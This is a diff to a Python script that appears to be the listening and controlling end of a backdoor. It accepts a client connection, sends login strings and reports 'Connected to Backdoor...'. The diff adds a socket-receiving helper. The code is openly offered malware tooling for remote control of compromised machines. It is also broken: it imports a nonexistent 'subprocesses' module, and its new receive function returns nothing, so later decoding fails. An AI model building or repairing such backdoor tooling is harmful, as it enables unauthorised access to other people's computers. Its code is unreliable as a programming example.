@@ -2,6 +2,14 @@ import socket
 import json
 import os
 import subprocesses
+def recieve(s, buff=1024):
+	global data
+	data = b''
+	while True:
+		packet = s.recv(buff)
+		data += packet
+		if len(packet) < buff:
+			break
 def cd(newdir):
 	global path, cwd
 	path = os.path.normpath(f'{path}/{newdir}')
@@ -14,7 +22,7 @@ while True:
 	port = settings['port']
 	print('\n\n - Use \'@HELP\' or \'::?\' for a list of commands.')
 	print(' - Use \'@GO\' or \'::!\' to start listening for connections.')
-	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program')
+	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program\n\n')
 	while True:
 		usrin = input('>> ')
 		if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
@@ -30,14 +38,14 @@ while True:
 	client, addr = srvr.accept()
 	print(f'Connection from {addr} has been established...')
 	while True:
-		data = client.recv(1024).strip()
+		data = recieve(client)
 		msg = data.decode()
 		if msg == '@LOGIN':
 			while True:
 				login = input('Login: ')
 				data = bytes(login, 'utf-8')
 				client.send(data)
-				data = client.recv(1024).strip()
+				data = recieve(client)
 				msg = data.decode()
 				if msg == '@CONNECTED':
 					print('Connected to Backdoor...')
